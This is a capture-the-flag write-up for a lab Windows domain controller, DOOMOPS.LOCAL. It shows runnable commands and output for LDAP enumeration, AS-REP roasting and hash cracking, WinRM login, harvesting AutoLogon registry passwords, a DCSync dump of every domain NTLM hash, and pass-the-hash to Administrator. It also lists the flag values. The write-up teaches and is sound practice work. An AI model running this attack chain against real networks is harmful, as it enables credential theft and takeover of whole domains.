# CTF Writeup — DoomOps (DOOMOPS.LOCAL)

## Overview

**Target:** `10.150.150.66`  
**Domain:** `DOOMOPS.LOCAL`  
**DC:** `DC-DOOMOPS.DOOMOPS.LOCAL`  
**Tools used:** Nmap, impacket-GetNPUsers, hashcat, Evil-WinRM, PowerView, impacket-secretsdump

---

## Step 1: Port Scanning

### Phase 1 — Full Port Scan

```bash
nmap -sS -T4 --open -p- 10.150.150.66
```

**Open ports:**

```
PORT       STATE  SERVICE
53/tcp     open   domain
88/tcp     open   kerberos-sec
135/tcp    open   msrpc
139/tcp    open   netbios-ssn
389/tcp    open   ldap
445/tcp    open   microsoft-ds
464/tcp    open   kpasswd5
593/tcp    open   http-rpc-epmap
636/tcp    open   ldapssl
3268/tcp   open   globalcatLDAP
3269/tcp   open   globalcatLDAPssl
3389/tcp   open   ms-wbt-server
5985/tcp   open   wsman
9389/tcp   open   adws
49665/tcp  open   unknown
49666/tcp  open   unknown
49669/tcp  open   unknown
49672/tcp  open   unknown
49674/tcp  open   unknown
49675/tcp  open   unknown
49680/tcp  open   unknown
49691/tcp  open   unknown
49705/tcp  open   unknown
```

### Phase 2 — Service & Version Detection

```bash
nmap -sS -sV -sC -O -T4 \
  -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49665,49666,49669,49672,49674,49675,49680,49691,49705 \
  --open -oA ptd_phase2_10.150.150.66 10.150.150.66
```

**Key findings:**

```
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-04 07:43:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
                              (Domain: DOOMOPS.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
                              (Domain: DOOMOPS.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

**RDP NTLM Info (from Nmap):**

```
Target_Name:          DOOMOPS
NetBIOS_Domain_Name:  DOOMOPS
NetBIOS_Computer_Name: DC-DOOMOPS
DNS_Domain_Name:      DOOMOPS.LOCAL
DNS_Computer_Name:    DC-DOOMOPS.DOOMOPS.LOCAL
DNS_Tree_Name:        DOOMOPS.LOCAL
Product_Version:      10.0.17763
```

**OS Guess:** Windows Server 2019 (97%) / Windows 10 1903–21H1 (91%)

**SMB:**
```
smb2-security-mode: Message signing enabled and required
```

---

## Step 2: LDAP Enumeration

### LDAP Root DSE + User Enumeration

```bash
nmap --script ldap-rootdse,ldap-search -p 389,636,3268,3269 10.150.150.66
```

**Root DSE highlights:**
- Domain: `DC=DOOMOPS,DC=LOCAL`
- LDAP Service: `DOOMOPS.LOCAL:dc-doomops$@DOOMOPS.LOCAL`
- Domain/Forest/DC Functionality Level: **7** (Windows Server 2016+)
- Global Catalog ready: TRUE

**Discovered domain users:**

| User         | DN                                        | Notes                                         |
|--------------|-------------------------------------------|-----------------------------------------------|
| Guest        | CN=Guest,CN=Users,DC=DOOMOPS,DC=LOCAL     | Built-in, disabled                            |
| **Revenant** | CN=Revenant,CN=Users,DC=DOOMOPS,DC=LOCAL  | Member of Remote Management Users; **FLAG4 in description** |
| Cacodemon    | CN=Cacodemon,CN=Users,DC=DOOMOPS,DC=LOCAL | userAccountControl: 66050 (disabled)          |
| **Cyberdemon** | CN=Cyberdemon,CN=Users,DC=DOOMOPS,DC=LOCAL | Member of Remote Management Users           |
| Spectre      | CN=Spectre,CN=Users,DC=DOOMOPS,DC=LOCAL   | userAccountControl: 66050 (disabled)          |
| Mancubus     | CN=Macubus,CN=Users,DC=DOOMOPS,DC=LOCAL   | userAccountControl: 66050 (disabled)          |
| Hellhound    | CN=Hellhound,CN=Users,DC=DOOMOPS,DC=LOCAL | userAccountControl: 66050 (disabled)          |
| Spiderdemon  | CN=Spiderdemon,CN=Users,DC=DOOMOPS,DC=LOCAL | userAccountControl: 66050 (disabled)        |

### FLAG 4 — Hidden in LDAP Description Field

The Revenant user object contained a flag embedded in the `description` attribute — visible via unauthenticated LDAP enumeration:

```
dn: CN=Revenant,CN=Users,DC=DOOMOPS,DC=LOCAL
    cn: Revenant
    description: FLAG4=ce262e730c845a312541d0545f77fbec
    memberOf: CN=Remote Management Users,CN=Builtin,DC=DOOMOPS,DC=LOCAL
    sAMAccountName: revenant
    userPrincipalName: revenant@DOOMOPS.LOCAL
    userAccountControl: 4260352
```

**FLAG 4: `ce262e730c845a312541d0545f77fbec`**

---

## Step 3: SMB & RDP Enumeration

### SMB

```bash
nmap --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010,smb-security-mode,smb2-security-mode -p 445 10.150.150.66
```

```
smb2-security-mode:
  3.1.1:
    Message signing enabled and required
```

No shares accessible anonymously; EternalBlue (MS17-010) not present.

### RDP

```bash
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 10.150.150.66
```

```
rdp-enum-encryption:
  Security layer
    CredSSP (NLA): SUCCESS
    CredSSP with Early User Auth: SUCCESS
    RDSTLS: SUCCESS
    SSL: SUCCESS
  RDP Protocol Version: RDP 10.6 server
```

NLA is enforced — RDP requires valid credentials.

---

## Step 4: AS-REP Roasting — Cracking revenant's Hash

The `revenant` account has Kerberos pre-authentication disabled (`userAccountControl: 4260352`), making it vulnerable to AS-REP roasting.

### Requesting AS-REP Hash

```bash
impacket-GetNPUsers DOOMOPS.LOCAL/revenant -no-pass -dc-ip 10.150.150.66
```

```
[*] Getting TGT for revenant
$krb5asrep$23$revenant@DOOMOPS.LOCAL:50b6ac649dbce9109582b632c4aa668d$c2b64b1f6fa3ef43
4e5a51aa74d8c2794532c72489fbe019e1197d3ceed3ec4121eb84acaf8b0dd87c7ebc558f420e5f5800
73d2f4aa06728d5eb9dde658c72dc1dabb897950659cc74d0e3438932bc1459d7cd2ed048154725857b6
80e04856aa73787b78b4b54b54824808195c3ff096fc20b2e40ceace3e4815205b2debf305f4d04494db
668a5f90c6e357002205d5c6c7e576243dd6b6868d37f9706b9795231a5b9b514e701552e61debce4257
cdaa55744b438ffdb9ce6fd5e018f58f1ce332cde8209cac038e4b44f66014a1a40c44107602f8b34d1
f5c1ff23f51b0d2c55025e1a77beb0249dbbb6564
```

### Cracking with Hashcat

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
```

```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$revenant@DOOMOPS.LOCAL:50b6ac649dbce9...bb6564
Time.Started.....: Mon May  4 04:15:51 2026, (22 secs)
Time.Estimated...: Mon May  4 04:16:13 2026, (0 secs)
Speed.#01........: 397.4 kH/s (4.37ms)
Progress.........: 8536064/14344385 (59.51%)
Recovered........: 1/1 (100.00%) Digests
Candidates.#01...: dorean&chey -> doogie08
```

**Cracked password:** `doomhammer211*`

---

## Step 5: Initial Access as revenant — FLAG 1

```bash
evil-winrm -i 10.150.150.66 -u revenant -p 'doomhammer211*'
```

```
Evil-WinRM* PS C:\Users\revenant\Desktop>
```

```powershell
dir C:\Users\revenant\Desktop
```

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2020  12:59 PM             40 FLAG1.txt
```

```powershell
type C:\Users\revenant\Desktop\FLAG1.txt
```

**FLAG 1: `374eb6bf740946abf0a54e96d40c42eaaa0ba03d`**

---

## Step 6: Privilege Escalation — Winlogon AutoLogon Credentials

Uploaded PowerView for further enumeration, then queried the Winlogon registry key:

```powershell
upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Output (key fields):**

```
DefaultDomainName    REG_SZ    DOOMOPS
DefaultUserName      REG_SZ    cyberdemon
DefaultPassword      REG_SZ    Ocz%F972q%eU
DisableCAD           REG_DWORD 0x1
```

AutoLogon credentials for `cyberdemon` are stored in plaintext in the registry — a common misconfiguration on Windows systems configured for kiosk/auto-login.

**Credentials found: `cyberdemon` / `Ocz%F972q%eU`**

---

## Step 7: Domain Credential Dump with secretsdump — FLAG 2

Using the cyberdemon credentials, a DCSync attack was performed to dump all domain hashes:

```bash
impacket-secretsdump cyberdemon:'Ocz%F972q%eU'@10.150.150.66 -just-dc
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e4e2dac5807fb745533e0dda18bfbf6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a13e33ba58e828d7f61b7ac093bfa62:::
DOOMOPS.LOCAL\revenant:1103:aad3b435b51404eeaad3b435b51404ee:cc5db434948613b67a7b94b24dac60ad:::
DOOMOPS.LOCAL\cacodemon:1104:aad3b435b51404eeaad3b435b51404ee:4ae0e407af88d94d2d61b069782b3ead:::
DOOMOPS.LOCAL\cyberdemon:1105:aad3b435b51404eeaad3b435b51404ee:53bb791f2330f97c549d0d73daf11eee:::
DOOMOPS.LOCAL\spectre:1106:aad3b435b51404eeaad3b435b51404ee:af1ce68f65cb4a71ed2f69a746d44e1b:::
DOOMOPS.LOCAL\mancubus:1107:aad3b435b51404eeaad3b435b51404ee:8c2a305396f3aeef34410fc0a04989b4:::
DOOMOPS.LOCAL\hellhound:1108:aad3b435b51404eeaad3b435b51404ee:bebecdec6dc29add09c597a560363ac2:::
DOOMOPS.LOCAL\spiderdemon:1109:aad3b435b51404eeaad3b435b51404ee:d4b5b35945e7e5354228e4404044089d:::
DC-DOOMOPS$:1000:aad3b435b51404eeaad3b435b51404ee:8c9cc34580e65f10bf5c6b90ade128f5:::
EVIL$:4101:aad3b435b51404eeaad3b435b51404ee:f83bb1e420433417a03a43d2a5363114:::
```

**Kerberos keys also dumped** (AES256, AES128, DES) for Administrator, krbtgt, and all domain users.

---

### Retrieving FLAG 2 — Accessing cyberdemon's Desktop

Pass-the-Hash as Administrator to access cyberdemon's profile:

```bash
evil-winrm -i 10.150.150.66 -u Administrator -H 9e4e2dac5807fb745533e0dda18bfbf6
```

```
Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```powershell
cd C:\Users\cyberdemon\Desktop
ls
```

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2020   1:01 PM             40 FLAG2.txt
```

```powershell
type Flag2.txt
```

**FLAG 2: `1b4210aeefcb65392d71e9c4b336f1e52e7b2c45`**

---

## Step 8: FLAG 3 — Administrator's Desktop

Recursive search for all flag files across the filesystem:

```powershell
dir C:\ -Recurse -Include "FLAG*.txt" -ErrorAction SilentlyContinue
```

```
Directory: C:\Users\Administrator\Desktop
    FLAG3.txt    10/26/2020  1:03 PM    40

Directory: C:\Users\cyberdemon\Desktop
    FLAG2.txt    10/26/2020  1:01 PM    40

Directory: C:\Users\revenant\Desktop
    FLAG1.txt    10/26/2020 12:59 PM    40
```

```powershell
cd C:\Users\Administrator\Desktop
type Flag3.txt
```

**FLAG 3: `eb7db6f94a89723c7561723ae503ad17f8250562`**

---

## Summary of Flags

| Flag   | Value                                      | Location / Method                                      |
|--------|--------------------------------------------|--------------------------------------------------------|
| FLAG 1 | `374eb6bf740946abf0a54e96d40c42eaaa0ba03d` | `C:\Users\revenant\Desktop\FLAG1.txt` — via Evil-WinRM after AS-REP roast |
| FLAG 2 | `1b4210aeefcb65392d71e9c4b336f1e52e7b2c45` | `C:\Users\cyberdemon\Desktop\FLAG2.txt` — Pass-the-Hash as Administrator |
| FLAG 3 | `eb7db6f94a89723c7561723ae503ad17f8250562` | `C:\Users\Administrator\Desktop\FLAG3.txt` — Administrator desktop |
| FLAG 4 | `ce262e730c845a312541d0545f77fbec`          | LDAP `description` field on `CN=Revenant` — unauthenticated enumeration |

---

## Attack Chain Summary

```
Nmap scan → DC identified (DOOMOPS.LOCAL, DC-DOOMOPS)
    ↓
LDAP enumeration (unauthenticated)
    → Discover domain users
    → FLAG 4 in revenant's description field
    ↓
AS-REP Roasting (revenant has pre-auth disabled)
    → Hash cracked: doomhammer211*
    ↓
Evil-WinRM as revenant
    → FLAG 1
    ↓
PowerView upload → Winlogon registry query
    → Plaintext AutoLogon creds: cyberdemon / Ocz%F972q%eU
    ↓
impacket-secretsdump (DCSync as cyberdemon)
    → Full NTDS dump: all NTLM hashes + Kerberos keys
    ↓
Pass-the-Hash as Administrator
    → FLAG 2 (cyberdemon's desktop)
    → FLAG 3 (Administrator's desktop)
```

---

## Tools Used

| Tool                      | Purpose                                              |
|---------------------------|------------------------------------------------------|
| **Nmap**                  | Port scanning, service detection, LDAP/SMB/RDP scripts |
| **impacket-GetNPUsers**   | AS-REP roasting (Kerberos hash extraction)           |
| **hashcat**               | Hash cracking (mode 18200 — AS-REP)                 |
| **Evil-WinRM**            | Remote shell via WinRM (port 5985)                   |
| **PowerView**             | AD enumeration, Winlogon credential discovery        |
| **impacket-secretsdump**  | DCSync — full domain credential dump                 |
